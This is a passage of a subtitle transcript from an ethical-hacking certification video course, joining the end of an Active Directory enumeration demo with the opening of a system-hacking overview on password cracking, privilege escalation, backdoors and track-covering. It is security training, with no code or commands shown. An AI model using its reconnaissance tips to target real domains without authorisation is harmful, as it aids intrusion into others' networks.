here.\n\n673\n00:29:26.519 --> 00:29:28.023\nJust gonna get the tool spun up.\n\n674\n00:29:28.023 --> 00:29:31.131\nSo we can actually see it in real time.\n\n675\n00:29:31.131 --> 00:29:33.410\nLook I've got my profile picture\nsitting in on my desktop.\n\n676\n00:29:33.410 --> 00:29:34.330\nIsn't that cool?\n\n677\n00:29:34.330 --> 00:29:35.520\n>> It's lovely.\n>> Outstanding.\n\n678\n00:29:35.520 --> 00:29:36.880\nAll right, give me one more sec.\n\n679\n00:29:36.880 --> 00:29:38.340\nWe're almost ready to go here.\n\n680\n00:29:38.340 --> 00:29:39.330\nAnd where is it?\n\n681\n00:29:39.330 --> 00:29:40.023\nThere it is right there.\n\n682\n00:29:40.023 --> 00:29:40.914\nLet's just bring it up.\n\n683\n00:29:40.914 --> 00:29:42.011\nWe'll just give it a second.\n\n684\n00:29:42.011 --> 00:29:43.552\nNo, we don't care about registering.\n\n685\n00:29:43.552 --> 00:29:44.403\nAll right, so.\n\n686\n00:29:44.403 --> 00:29:49.671\nWhat we're gonna do here, let me\njust open this up, is the following.\n\n687\n00:29:49.671 --> 00:29:53.120\nWe're gonna go and bring up our users.\n\n688\n00:29:53.120 --> 00:29:54.289\nWe're gonna right-click.\n\n689\n00:29:54.289 --> 00:29:55.008\nAll right, so yeah.\n\n690\n00:29:55.008 --> 00:29:56.320\nIf we go to the tool right here.\n\n691\n00:29:56.320 --> 00:29:58.340\nSo you can see I've got Hyena open.\n\n692\n00:29:58.340 --> 00:30:02.810\nAnd I've just gone in and\nI've right-clicked on users.\n\n693\n00:30:02.810 --> 00:30:04.696\nI've gone to query active directory and\n\n694\n00:30:04.696 --> 00:30:07.040\nnotice all the general\nqueries I have right?\n\n695\n00:30:07.040 --> 00:30:11.560\nDisabled users, users modified the last\n30 days, users with expired accounts,\n\n696\n00:30:11.560 --> 00:30:13.280\nusers is expiring after today.\n\n697\n00:30:13.280 --> 00:30:16.350\nSo what I may want to do\nis I may want to go in and\n\n698\n00:30:16.350 --> 00:30:19.160\ntake a look at accounts that have\nbeen modified in the last 30 days.\n\n699\n00:30:19.160 --> 00:30:20.220\nMaybe something's going on.\n\n700\n00:30:20.220 --> 00:30:21.020\nMaybe it's a hacker.\n\n701\n00:30:21.020 --> 00:30:24.076\nI'm thinking hey, maybe they've\nbeen given new permissions, or\n\n702\n00:30:24.076 --> 00:30:26.769\nmaybe they've changed roles,\nor who knows what, right?\n\n703\n00:30:26.769 --> 00:30:30.590\nSo I could use a tool like this\nwith a bunch of pre-built queries.\n\n704\n00:30:30.590 --> 00:30:32.550\nAnd I could easily go in and do that.\n\n705\n00:30:32.550 --> 00:30:36.231\nBut I could also and again, I'm not\nsuggesting as a hacker you're definitely\n\n706\n00:30:36.231 --> 00:30:38.420\ngonna get to go play at\nthe source all the time.\n\n707\n00:30:38.420 --> 00:30:41.480\nBut I'm gonna log in to\nmy domain controller.\n\n708\n00:30:41.480 --> 00:30:46.390\nAnd we could right,\nend the domain controller.\n\n709\n00:30:46.390 --> 00:30:47.680\nGo right in.\n\n710\n00:30:47.680 --> 00:30:51.110\nI've got the active directory user group\nand management tools set up there.\n\n711\n00:30:51.110 --> 00:30:55.030\nAnd I could, on the domain itself,\nright here right.\n\n712\n00:30:55.030 --> 00:30:59.025\nI could go in and\nI can do a variety of things.\n\n713\n00:30:59.025 --> 00:31:00.364\nYou've probably seen this, right?\n\n714\n00:31:00.364 --> 00:31:01.960\nI can go in, and create new users.\n\n715\n00:31:01.960 --> 00:31:03.380\nDo all sorts of stuff.\n\n716\n00:31:03.380 --> 00:31:09.000\nBut in addition, what I can do\nis I can come in here and I can.\n\n717\n00:31:09.000 --> 00:31:10.072\nWhere am I going?\n\n718\n00:31:10.072 --> 00:31:12.121\nI'm going right up here, sorry.\n\n719\n00:31:12.121 --> 00:31:15.810\nI can go in and, give me just one second.\n\n720\n00:31:15.810 --> 00:31:19.554\nLet me just make sure that we've\ngot our right functional level.\n\n721\n00:31:19.554 --> 00:31:22.012\nThere we go, okay 2012 R2.\n\n722\n00:31:22.012 --> 00:31:24.210\nI can come in here to queries, right?\n\n723\n00:31:24.210 --> 00:31:25.869\nAnd I can make sure that I right-click.\n\n724\n00:31:25.869 --> 00:31:28.593\nAnd either import existing queries,\nor I can go ahead and\n\n725\n00:31:28.593 --> 00:31:30.530\ncreate a brand new query, right?\n\n726\n00:31:30.530 --> 00:31:35.260\nSo I can go ahead and I can use these\nqueries to be able to go ahead and\n\n727\n00:31:35.260 --> 00:31:36.710\nI can do a variety of things, right?\n\n728\n00:31:36.710 --> 00:31:38.120\nSo I can give it a name.\n\n729\n00:31:38.120 --> 00:31:38.730\nI don't know.\n\n730\n00:31:38.730 --> 00:31:40.310\nWhatever I want to call it.\n\n731\n00:31:40.310 --> 00:31:44.130\nAnd then I could define my query and\nI could go in and through point and\n\n732\n00:31:44.130 --> 00:31:46.310\nclick without having to know\nmuch about query language.\n\n733\n00:31:46.310 --> 00:31:51.250\nI can go in and write a query that gives\nme a variety of pieces of information.\n\n734\n00:31:51.250 --> 00:31:54.283\nSo I could go in for instance and\ndefine the variables, right?\n\n735\n00:31:54.283 --> 00:31:56.409\nSo I could say name starts with.\n\n736\n00:31:56.409 --> 00:31:58.465\nAnd I could say all\nusers with the letter A,\n\n737\n00:31:58.465 --> 00:32:00.590\ncuz I might want administrative accounts.\n\n738\n00:32:00.590 --> 00:32:04.329\nI could say I want to see disabled\naccounts or non-expiring passwords.\n\n739\n00:32:04.329 --> 00:32:05.650\nThat's always a good one.\n\n740\n00:32:05.650 --> 00:32:08.600\nShow me all the users that have\nnon-expiring passwords why?\n\n741\n00:32:08.600 --> 00:32:12.390\nWell because most admin accounts\nhave non-expiring passwords, right?\n\n742\n00:32:12.390 --> 00:32:14.390\nShow me days since last log on.\n\n743\n00:32:14.390 --> 00:32:18.520\nI can go in and say show me accounts that\nhave not logged in in up to 180 days.\n\n744\n00:32:18.520 --> 00:32:19.540\n>> Wow.\n>> And run that, and\n\n745\n00:32:19.540 --> 00:32:22.340\nthat's just right,\nthat's in the interface.\n\n746\n00:32:22.340 --> 00:32:26.053\nThat's Microsoft giving me that without me\neven having to know how to write a query,\n\n747\n00:32:26.053 --> 00:32:27.950\nall I have to do is point and\nclick, right?\n\n748\n00:32:27.950 --> 00:32:32.164\nSo if I just want disabled or, excuse me,\nI want non-expiring accounts, right, and\n\n749\n00:32:32.164 --> 00:32:34.722\nI don't wanna see anything else,\nI just want that.\n\n750\n00:32:34.722 --> 00:32:36.360\nClick OK.\n\n751\n00:32:36.360 --> 00:32:37.430\nClick OK.\n\n752\n00:32:37.430 --> 00:32:38.160\nRun that.\n\n753\n00:32:38.160 --> 00:32:41.080\nThose are all the accounts right there\nthat have non-expiring passwords.\n\n754\n00:32:41.080 --> 00:32:44.770\nI don't even need to know\nanything about writing a query.\n\n755\n00:32:44.770 --> 00:32:46.940\nI just have to be able to point and click.\n\n756\n00:32:46.940 --> 00:32:49.150\nThat's how easy it may be, right?\n\n757\n00:32:49.150 --> 00:32:52.503\nAnd as a pen tester, as a CEH,\nshould I be going in and\n\n758\n00:32:52.503 --> 00:32:56.865\nrunning that on my domains to\nverify the information I'm getting?\n\n759\n00:32:56.865 --> 00:32:59.915\nTo make sure that when I\nenumerate I know it's there, but\n\n760\n00:32:59.915 --> 00:33:04.300\nalso from a countermeasure perspective,\nshould I be doing that to make sure that I\n\n761\n00:33:04.300 --> 00:33:08.141\nknow why every one of those accounts\ndon't have an expiring password?\n\n762\n00:33:08.141 --> 00:33:10.706\nAnd why every one of those accounts\nmay have not logged in in so\n\n763\n00:33:10.706 --> 00:33:11.820\nmany days, I should.\n\n764\n00:33:11.820 --> 00:33:14.790\n>> I'll betcha if you're auditing me,\nI better be able to document that.\n\n765\n00:33:14.790 --> 00:33:16.390\nBetter have a good reason for it, right?\n\n766\n00:33:16.390 --> 00:33:16.950\n>> Absolutely.\n\n767\n00:33:16.950 --> 00:33:18.380\nBetter have a good reason for it, right?\n\n768\n00:33:18.380 --> 00:33:19.395\nThank you sir, may I have another?\n\n769\n00:33:19.395 --> 00:33:21.360\n>> [LAUGH]\n>> Is what we often said, right?\n\n770\n00:33:21.360 --> 00:33:23.670\n>> So these are the kind\nof things that we can do.\n\n771\n00:33:23.670 --> 00:33:27.370\nThese are the kind of things that as\nan ethical hacker you should be aware of.\n\n772\n00:33:27.370 --> 00:33:30.360\nThese are the counter measures, but\nalso these are the thought processes\n\n773\n00:33:30.360 --> 00:33:32.710\nthat attackers are gonna\nbring to your front door.\n\n774\n00:33:32.710 --> 00:33:35.395\nThe question is how prepared\nare you to play, right?\n\n775\n00:33:35.395 --> 00:33:36.850\nNot how good or bad you are, but\n\n776\n00:33:36.850 --> 00:33:38.850\nare you willing to step on\nthe field in the first place.\n\n777\n00:33:38.850 --> 00:33:39.440\nBecause if you are,\n\n778\n00:33:39.440 --> 00:33:43.740\nyou're probably gonna stop a lot of things\ncuz you're just, point of presence, right?\n\n779\n00:33:43.740 --> 00:33:47.550\nYou're there and what often happens\nis hackers that see that you're there\n\n780\n00:33:47.550 --> 00:33:50.290\nare gonna be very likely to go\nplay somewhere else, right?\n\n781\n00:33:50.290 --> 00:33:53.700\nIt's that idea of putting that big sign\nup on the front door, you know, bad dog,\n\n782\n00:33:53.700 --> 00:33:55.740\nor you know alarm or whatever.\n\n783\n00:33:55.740 --> 00:33:58.060\nYou may not have one,\nright, but the reality is,\n\n784\n00:33:58.060 --> 00:34:00.420\npeople outside the door don't know that,\nright?\n\n785\n00:34:00.420 --> 00:34:01.550\nSo, they're gonna go down the street and\n\n786\n00:34:01.550 --> 00:34:05.020\nplay somewhere where it's dark, and\nnobody's around, and there is no alarm.\n\n787\n00:34:05.020 --> 00:34:08.300\nCuz it's a lot more obvious to them\nthat it's gonna be a higher chance\n\n788\n00:34:08.300 --> 00:34:09.420\nof success to get in.\n\n789\n00:34:09.420 --> 00:34:11.630\nAnd this is the thing\nwe wanna talk about and\n\n790\n00:34:11.630 --> 00:34:14.150\nit's the unspoken thing about\nnetwork security sometimes.\n\n791\n00:34:14.150 --> 00:34:18.420\nIt's that sleight of hand, that magic that\nwe engage in to make the attacker think\n\n792\n00:34:18.420 --> 00:34:19.840\nthat it's gonna be hard to get in.\n\n793\n00:34:19.840 --> 00:34:20.690\nIt may not be, right?\n\n794\n00:34:20.690 --> 00:34:22.670\nThere may be just nothing but\nsmoke and mirrors there.\n\n795\n00:34:22.670 --> 00:34:23.640\nAnd I'm not suggesting for\n\n796\n00:34:23.640 --> 00:34:27.060\na minute that that's your first\ngo-to line of defense, right?\n\n797\n00:34:27.060 --> 00:34:30.080\nI'm just pointing out that you can't\nbe in all places at all times.\n\n798\n00:34:30.080 --> 00:34:31.580\nAnd you can't be all things to all people.\n\n799\n00:34:31.580 --> 00:34:32.540\nAnd you hopefully know that.\n\n800\n00:34:32.540 --> 00:34:34.600\nAnd I'm just being realistic with you.\n\n801\n00:34:34.600 --> 00:34:37.430\nYou gotta make as good\na defensive stand as you can\n\n802\n00:34:37.430 --> 00:34:39.660\nto protect your network\nfrom the bad people.\n\n803\n00:34:39.660 --> 00:34:42.170\nBut sometimes some of the stuff you do\n\n804\n00:34:42.170 --> 00:34:45.440\nmay not actually make sense to anybody but\nyou.\n\n805\n00:34:45.440 --> 00:34:49.020\nBut if somebody outside sees it,\nand looks at it and goes, wow,\n\n806\n00:34:49.020 --> 00:34:51.320\nI don't want to go in there because\nchances are they're monitoring,\n\n807\n00:34:51.320 --> 00:34:54.170\nthen they may go somewhere else,\nand that's fine.\n\n808\n00:34:54.170 --> 00:34:57.150\nThat sucks for the person they go attack,\nbut that's their problem,\n\n809\n00:34:57.150 --> 00:34:58.260\nnot yours, right?\n\n810\n00:34:58.260 --> 00:35:02.060\nIt's their responsibility to be better and\nprevent the attacker from coming in.\n\n811\n00:35:02.060 --> 00:35:05.710\nYour responsibility is to your customer,\nnot to the person down the road\n\n812\n00:35:05.710 --> 00:35:08.350\nwho may get attacked because they're\nnot as prepared as you, right?\n\n813\n00:35:08.350 --> 00:35:09.290\nSo think about that, right?\n\n814\n00:35:09.290 --> 00:35:10.900\nYou've gotta think like the attacker.\n\n815\n00:35:10.900 --> 00:35:13.040\nThe attackers gonna wanna come in and\n\n816\n00:35:13.040 --> 00:35:15.560\nplay in the dark sandbox where\nnobody's gonna bother them.\n\n817\n00:35:15.560 --> 00:35:17.779\nThe attacker doesn't wanna be in\nthe middle of the spotlight where\n\n818\n00:35:17.779 --> 00:35:19.070\neverything's going on.\n\n819\n00:35:19.070 --> 00:35:23.180\nAnd as an ethical hacker, if you know\nthat, you can create your network defenses\n\n820\n00:35:23.180 --> 00:35:26.620\nin such a way that they\nare islands of light, right?\n\n821\n00:35:26.620 --> 00:35:28.910\nThat are very hard to sneak up on.\n\n822\n00:35:28.910 --> 00:35:31.630\nAnd if that's the case,\nhackers tend to not want to play there.\n\n823\n00:35:31.630 --> 00:35:34.010\nThey wanna be anonymous, that's,\nI mean that's the nature of what they do.\n\n824\n00:35:35.060 --> 00:35:38.963\n>> All right Adam, another great look at\nenumeration as we kind of rounded out our\n\n825\n00:35:38.963 --> 00:35:41.164\nconversation about what enumeration was.\n\n826\n00:35:41.164 --> 00:35:42.878\nWe took a look at some of\nthe different techniques.\n\n827\n00:35:42.878 --> 00:35:48.353\nSome of the things that we've got to\nthink about, like SMTP or SNMP, you know,\n\n828\n00:35:48.353 --> 00:35:53.370\nour message information blocks and,\nwhat else did we talk about there?\n\n829\n00:35:53.370 --> 00:35:56.730\nWe talked about some of the\ncountermeasures that we might put in place\n\n830\n00:35:56.730 --> 00:35:59.180\nto prevent some of this\nenumeration on our end.\n\n831\n00:35:59.180 --> 00:36:02.870\nSo we thank you for that, some great\ndemonstrations there, and explanations.\n\n832\n00:36:02.870 --> 00:36:04.620\nHope everybody out there enjoyed watching.\n\n833\n00:36:04.620 --> 00:36:07.430\nSigning off for ITProTV, I'm Mike Rodrick.\n\n834\n00:36:07.430 --> 00:36:08.590\n>> I'm a stealthy

at ITProTV.\n\n4\n00:00:15.549 --> 00:00:19.290\nI'm your host, Mike Rodrick, and\ntoday we're doing our CEH version nine.\n\n5\n00:00:19.290 --> 00:00:23.580\nAnd specifically in this episode,\nwe're gonna be looking at system hacking.\n\n6\n00:00:23.580 --> 00:00:28.420\nThis is phase four, I guess we're on,\nbecause we've got fingerprinting,\n\n7\n00:00:28.420 --> 00:00:32.470\nreconnaissance, then we went to scanning,\nthen we went through enumeration and\n\n8\n00:00:32.470 --> 00:00:33.770\nnow we're in the system hacking.\n\n9\n00:00:33.770 --> 00:00:35.790\nRight?\nWe've started listing things out.\n\n10\n00:00:35.790 --> 00:00:38.330\nThings that we potentially want to target.\n\n11\n00:00:38.330 --> 00:00:40.160\nAnd now it's time to I\nthink actually target that.\n\n12\n00:00:40.160 --> 00:00:42.610\nAnd so here to help us with that is Mr.\nAdam Gordon.\n\n13\n00:00:42.610 --> 00:00:43.400\nHow you doing Adam?\n\n14\n00:00:43.400 --> 00:00:44.105\n>> I'm good.\nDid you say\n\n15\n00:00:44.105 --> 00:00:45.024\nfingerprinting or footprinting?\n\n16\n00:00:45.024 --> 00:00:48.897\n[CROSSTALK] I think you\nsaid fingerprinting.\n\n17\n00:00:48.897 --> 00:00:50.880\nIt should be footprinting,\njust so we're clear.\n\n18\n00:00:50.880 --> 00:00:53.889\n>> Fingerprinting was in the scanning,\nwhen we fingerprinting the OS.\n\n19\n00:00:53.889 --> 00:00:56.911\n>> Or finger painting, maybe you\neven said finger painting, which is\n\n20\n00:00:56.911 --> 00:01:02.180\nthe other studio down the hall where we're\ndoing fun with kitty painting today.\n\n21\n00:01:02.180 --> 00:01:05.700\nSo it is foot printing not fingerprinting.\n\n22\n00:01:05.700 --> 00:01:10.549\nYes now we are in the fourth topic in\nterms of building out the methodology.\n\n23\n00:01:10.549 --> 00:01:13.794\nAnd it's actually a great way to think\nabout starting to jump in here by way of\n\n24\n00:01:13.794 --> 00:01:15.690\nreviewing what we already have.\n\n25\n00:01:15.690 --> 00:01:18.970\nIf we are walking through\nthis one stage at a time, and\n\n26\n00:01:18.970 --> 00:01:23.460\nas an ethical hacker, kind of where we are\nright now in our acquisition of knowledge.\n\n27\n00:01:23.460 --> 00:01:26.500\nWhat do we have behind us,\nwhat are looking ahead and\n\n28\n00:01:26.500 --> 00:01:28.170\nthinking about having to do.\n\n29\n00:01:28.170 --> 00:01:32.260\nWe would have footprinted, we would have\nscanned, we would have enumerated by now,\n\n30\n00:01:32.260 --> 00:01:34.895\nso as a result we're now\ngonna think system hacking.\n\n31\n00:01:34.895 --> 00:01:37.360\nWe're gonna take all that\ninformation we've gathered\n\n32\n00:01:37.360 --> 00:01:39.490\nwe're going to attempt to put it to use.\n\n33\n00:01:39.490 --> 00:01:43.410\nTry to go live against the box or\nboxes, whatever the targets are, and\n\n34\n00:01:43.410 --> 00:01:46.340\ntry to figure out what we\ncan now take advantage of.\n\n35\n00:01:46.340 --> 00:01:48.810\nHow we can exploit those vulnerabilities,\nthose weaknesses,\n\n36\n00:01:48.810 --> 00:01:50.380\nthose things that we found.\n\n37\n00:01:50.380 --> 00:01:54.580\nAnd then as a result come up with some\nvery tangible and useful information.\n\n38\n00:01:54.580 --> 00:01:58.460\nThat will expose weakness, expose risk,\nand then allow us to figure out how to\n\n39\n00:01:58.460 --> 00:02:02.330\ncounteract that with counter measures that\ncan be applied, controls In other words.\n\n40\n00:02:02.330 --> 00:02:07.200\nThat can be placed into the system to\nchange that whole dynamic favoring us\n\n41\n00:02:07.200 --> 00:02:11.700\nthe defenders and hopefully making it much\nharder for the attackers to do their job.\n\n42\n00:02:11.700 --> 00:02:14.611\nSo when we think about this we're\ngoing to be trying to gain access.\n\n43\n00:02:14.611 --> 00:02:19.590\nWe're going to try to escalate privilege,\nperhaps execute applications, hide files,\n\n44\n00:02:19.590 --> 00:02:22.350\ncover our tracks,\ndo a variety of things in here.\n\n45\n00:02:22.350 --> 00:02:23.730\nThese are all goals.\n\n46\n00:02:23.730 --> 00:02:25.240\nInvolved with system hacking,\n\n47\n00:02:25.240 --> 00:02:28.420\nor things that we would want to do\nwith regards to system hacking.\n\n48\n00:02:28.420 --> 00:02:30.640\nEspecially covering our tracks at the end,\nright?\n\n49\n00:02:30.640 --> 00:02:33.240\nGetting rid of entries in the log files.\n\n50\n00:02:33.240 --> 00:02:36.690\nMaking sure we remove software\nthat we've installed to do things.\n\n51\n00:02:36.690 --> 00:02:39.460\nWe've played at and talked about\nthe idea of doing this before.\n\n52\n00:02:39.460 --> 00:02:42.540\nBut we haven't actually gone in and\nreally made a point of this yet.\n\n53\n00:02:42.540 --> 00:02:43.940\nThis is one of those things\nthat's gonna happen.\n\n54\n00:02:43.940 --> 00:02:46.075\nAnd then we're gonna be\nthinking about in this area.\n\n55\n00:02:46.075 --> 00:02:49.160\nWe may be password cracking,\nsocial engineering here\n\n56\n00:02:49.160 --> 00:02:53.020\nto gain access to passwords and then\nuse them to gain access to the system.\n\n57\n00:02:53.020 --> 00:02:56.820\nWe're going to try and escalate privileges\nthrough things like buffer overflows,\n\n58\n00:02:56.820 --> 00:02:58.000\nknown system vulnerabilities and\n\n59\n00:02:58.000 --> 00:03:01.340\nweaknesses that could be used\nto give us or gain an advantage.\n\n60\n00:03:01.340 --> 00:03:04.840\nWe're gonna try to execute applications\nthat would give us remote control.\n\n61\n00:03:04.840 --> 00:03:07.850\nRemote access capabilities,\nstaying power on the box,\n\n62\n00:03:07.850 --> 00:03:10.830\nnot just hey I got in, but\nI got in and I want to stay here and\n\n63\n00:03:10.830 --> 00:03:13.990\nI want to be able to come back,\nwhenever I want to over time.\n\n64\n00:03:13.990 --> 00:03:18.940\nSo trojans, spyware, backdoors,\nkeyloggers, all the goodies that\n\n65\n00:03:18.940 --> 00:03:23.054\ncome from the nasty software chest are\ngoing to be pretend to be arrayed here.\n\n66\n00:03:23.054 --> 00:03:27.410\nHiding files things like steganography\nusing stegano related tools and\n\n67\n00:03:27.410 --> 00:03:31.712\ntechniques we may root the system and\nuse root kits in order to do that.\n\n68\n00:03:31.712 --> 00:03:34.320\nFor good or for\nevil usually for evil right?\n\n69\n00:03:34.320 --> 00:03:35.300\nYou can work for Sony.\n\n70\n00:03:35.300 --> 00:03:36.015\nPerhaps not Sony.\n\n71\n00:03:36.015 --> 00:03:37.800\n>> [LAUGH].\n>> So, just think about that and\n\n72\n00:03:37.800 --> 00:03:38.740\nbe aware of that.\n\n73\n00:03:38.740 --> 00:03:42.070\nYou didn't know I was a comedian along\nwith being able to do all of this great\n\n74\n00:03:42.070 --> 00:03:43.610\nstuff and teach at the same time.\n\n75\n00:03:43.610 --> 00:03:44.870\nI'm here at all week people.\n\n76\n00:03:44.870 --> 00:03:47.550\nTip your bartenders and\nyour servers, I'm here all week.\n\n77\n00:03:47.550 --> 00:03:51.539\nSo you remember those Heinekin commercials\nfrom the comedian, I'm here all week.\n\n78\n00:03:51.539 --> 00:03:53.240\nThank you, I do comedy,\nthank you very much.\n\n79\n00:03:53.240 --> 00:03:54.090\nI'm here all week.\n\n80\n00:03:54.090 --> 00:03:55.040\nGreat commercial, so\n\n81\n00:03:55.040 --> 00:03:59.040\nanyway let's talk about what we're\ngonna do with regards to hacking.\n\n82\n00:03:59.040 --> 00:04:02.510\nWe've footprinted, we've scanned,\nwe've enumerated, now we're gonna hack.\n\n83\n00:04:02.510 --> 00:04:05.840\nSo gaining access,\none block of resource and\n\n84\n00:04:05.840 --> 00:04:09.420\none block of tactical elements we're\ngonna think about executing and\n\n85\n00:04:09.420 --> 00:04:12.180\ninteracting with here under\nthe banner of system hacking.\n\n86\n00:04:12.180 --> 00:04:16.340\nMaintaining access, once we get in\nwe wanna stay in as we talked about.\n\n87\n00:04:16.340 --> 00:04:19.220\nNot enough to get in there once and\nsay okay good, I'm done, right?\n\n88\n00:04:19.220 --> 00:04:20.810\nI've got to get back in there over time.\n\n89\n00:04:20.810 --> 00:04:22.400\nI want to execute multiple attacks.\n\n90\n00:04:22.400 --> 00:04:23.990\nI want to gather information.\n\n91\n00:04:23.990 --> 00:04:27.850\nI want to be able to listen passively and\nthen respond actively over time.\n\n92\n00:04:27.850 --> 00:04:30.170\nSo I want to set up\na centrally monitoring post.\n\n93\n00:04:30.170 --> 00:04:32.170\nAn outpost in the network.\n\n94\n00:04:32.170 --> 00:04:33.380\nYou ever do any hunting?\n\n95\n00:04:33.380 --> 00:04:34.000\n>> A little bit.\n\n96\n00:04:34.000 --> 00:04:37.005\n>> Yeah.\nSo you ever go duck hunting?\n\n97\n00:04:37.005 --> 00:04:37.820\n>> No.\n>> You ever go,\n\n98\n00:04:37.820 --> 00:04:40.610\nI don't know, rabbit hunting?\n\n99\n00:04:40.610 --> 00:04:41.410\n>> No.\nThe only thing I've\n\n100\n00:04:41.410 --> 00:04:43.570\nactually done is a little\nbit of quail hunting.\n\n101\n00:04:43.570 --> 00:04:44.160\n>> Quail?\n\n102\n00:04:44.160 --> 00:04:45.080\nWell, quail it's like pheasants.\n\n103\n00:04:45.080 --> 00:04:45.820\n>> It's a bird.\n\n104\n00:04:45.820 --> 00:04:46.490\n>> That's true.\n\n105\n00:04:46.490 --> 00:04:47.860\n>> It flies.\n>> That's true.\n\n106\n00:04:47.860 --> 00:04:48.620\n>> You've got to work on this.\n\n107\n00:04:48.620 --> 00:04:49.850\n>> The ducks are too.\nI think if the ducks are in\n\n108\n00:04:49.850 --> 00:04:50.430\na blind by a lake.\n\n109\n00:04:50.430 --> 00:04:51.480\n>> That's what I started to get at, right?\n\n110\n00:04:51.480 --> 00:04:52.600\nYou want to be in a blind\nyou don't do blinds?\n\n111\n00:04:52.600 --> 00:04:53.400\nI've never done quail hunting.\n\n112\n00:04:53.400 --> 00:04:54.110\n>> I think pheasants.\n\n113\n00:04:54.110 --> 00:04:56.590\nPheasants which have to go\nthrough the dogs and gotta fly\n\n114\n00:04:56.590 --> 00:04:57.620\n>> You gotta get them up in the air right\n\n115\n00:04:57.620 --> 00:05:00.330\nthen you shoot them in the air it's very\nsporting, they're flying away trying to\n\n116\n00:05:00.330 --> 00:05:02.950\nsay you know I'm getting away and\nyou shoot them in the ass.\n\n117\n00:05:02.950 --> 00:05:06.640\n>> I didn't shoot a single one they scared\nthe crap out of me when came out of the.\n\n118\n00:05:07.906 --> 00:05:09.679\n>> No No [LAUGH].\n\n119\n00:05:09.679 --> 00:05:13.290\n>> It's very very important to be able\nto delve into the mind ladies and\n\n120\n00:05:13.290 --> 00:05:14.370\ngentlemen of Mike.\n\n121\n00:05:14.370 --> 00:05:15.160\nThat's Mike Roderick.\n\n122\n00:05:15.160 --> 00:05:17.000\n>> That's why I have Publix.\n\n123\n00:05:17.000 --> 00:05:19.030\n>> Yes,\nyour local shopping center [LAUGH].\n\n124\n00:05:19.030 --> 00:05:20.700\n>> Or whole foods, or\nwherever you can buy them.\n\n125\n00:05:20.700 --> 00:05:22.170\nDo yet get quail or Publix?\n\n126\n00:05:22.170 --> 00:05:22.770\n>> I don't think so.\n\n127\n00:05:22.770 --> 00:05:23.810\n>> I don't think you care.\n\n128\n00:05:23.810 --> 00:05:26.060\nAnyway, we're not here to talk\nabout how you cook quail.\n\n129\n00:05:26.060 --> 00:05:28.810\nI was trying to make\nthe analogy of using a blind.\n\n130\n00:05:28.810 --> 00:05:30.520\nSo if you did or have done duck hunting,\n\n131\n00:05:30.520 --> 00:05:33.170\nI didn't know you don't use blinds, for\nquail, I've never been quail hunting.\n\n132\n00:05:33.170 --> 00:05:34.785\nBut I know about duck hunting.\n\n133\n00:05:34.785 --> 00:05:35.300\n>> Mm-hm.\n\n134\n00:05:35.300 --> 00:05:37.300\n>> And so I know in duck hunting and\ndeer hunting as well,\n\n135\n00:05:37.300 --> 00:05:38.380\nI should have led with that-\n>> There we go.\n\n136\n00:05:38.380 --> 00:05:40.341\n>> But you would have said no also,\nyou don't do that either.\n\n137\n00:05:40.341 --> 00:05:41.377\n>> [LAUGH]\n>> But in deer hunting and\n\n138\n00:05:41.377 --> 00:05:43.375\nduck hunting you're typically in a blind,\nyou're waiting, right?\n\n139\n00:05:43.375 --> 00:05:44.250\n>> Mm-hm.\n>> You've got sit around for\n\n140\n00:05:44.250 --> 00:05:47.220\nlong periods of time, and\nthen you want to be able to observe.\n\n141\n00:05:47.220 --> 00:05:48.480\nThat's the general idea.\n\n142\n00:05:48.480 --> 00:05:52.020\nSo the same prospect, or same thought\nprocess here, do we want to be able to set\n\n143\n00:05:52.020 --> 00:05:54.670\nup these outposts where we'll sit and\nwe'll observe what's going on.\n\n144\n00:05:54.670 --> 00:05:57.288\nAnd so maintaining access, very important.\n\n145\n00:05:57.288 --> 00:05:59.240\nAnd then as we talk about clearing up,\n\n146\n00:05:59.240 --> 00:06:01.790\ncleaning up after ourselves\nwith what's going on.\n\n147\n00:06:01.790 --> 00:06:06.240\nThat’s really the third major thought\nprocess and area with regards to activity\n\n148\n00:06:06.240 --> 00:06:09.220\nthat we are going to speak about a little\nbit here and be able to focus on.\n\n149\n00:06:09.220 --> 00:06:11.465\nWe are going to talk about\nthings like password cracking.\n\n150\n00:06:11.465 --> 00:06:14.020\nWe'll going to talk about escalation\nof privilege, we'll going to talk about\n\n151\n00:06:14.020 --> 00:06:17.870\nthe ability to execute applications like\nwe talked about, hiding files through\n\n152\n00:06:17.870 --> 00:06:20.470\nsteganography especially very important,\nwe'll take a look at that.\n\n153\n00:06:20.470 --> 00:06:21.240\nThat's kind of cool.\n\n154\n00:06:21.240 --> 00:06:23.800\nEspecially if you haven't done\nthat before, haven't seen that.\n\n155\n00:06:23.800 --> 00:06:26.540\nWe use what's called white space\npotentially in the system,\n\n156\n00:06:26.540 --> 00:06:28.780\nand we're able to take a picture for\ninstance.\n\n157\n00:06:28.780 --> 00:06:32.810\nAnd inside that picture,\nbreak up and essentially\n\n158\n00:06:32.810 --> 00:06:36.270\nput all the different pieces of the file\ninside the white space in the picture.\n\n159\n00:06:36.270 --> 00:06:40.860\nAnd you look at it and see Mike sitting\nin a duck blind waiting to hunt, or\n\n160\n00:06:40.860 --> 00:06:42.571\nMike running away from\npheasants because he's-.\n\n161\n00:06:42.571 --> 00:06:45.150\n>> [LAUGH]\n>> Scared of what we see is all that, but\n\n162\n00:06:45.150 --> 00:06:48.740\nthen in all that space we also see\nthe secret plans for Project X,\n\n163\n00:06:48.740 --> 00:06:49.850\nor whatever is there.\n\n164\n00:06:49.850 --> 00:06:52.350\nAnd we use tools to essentially\nto put the stuff in, and\n\n165\n00:06:52.350 --> 00:06:56.020\nwe use tools to separate it out, and\nwe can actually add or remove code there.\n\n166\n00:06:56.020 --> 00:06:58.400\nAnd so this is something that we'll\ntake a look at and talk about as well.\n\n167\n00:06:58.400 --> 00:07:00.030\nLet's start with password cracking.\n\n168\n00:07:00.030 --> 00:07:02.980\nSo when we talk about password cracking,\nwe're essentially talking about, hey,\n\n169\n00:07:02.980 --> 00:07:06.410\nI've got passwords, and\nI wanna figure out what they are.\n\n170\n00:07:06.410 --> 00:07:08.350\nNot I wanna steal them,\nthat's password stealing.\n\n171\n00:07:08.350 --> 00:07:11.319\nBut rather,\nI've gotten an encrypted password file or\n\n172\n00:07:11.319 --> 00:07:15.818\nI've gotten a dump of the password file,\nprobably the hashes is really what I have.\n\n173\n00:07:15.818 --> 00:07:19.890\nAnd I want to reverse engineer them, and I\nwant to be able to find out what they are.\n\n174\n00:07:19.890 --> 00:07:23.520\nThose of you that have been around for\na while and may have been doing this for\n\n175\n00:07:23.520 --> 00:07:27.980\nseveral years, you may remember that\nLinkedIn was hacked several years back.\n\n176\n00:07:27.980 --> 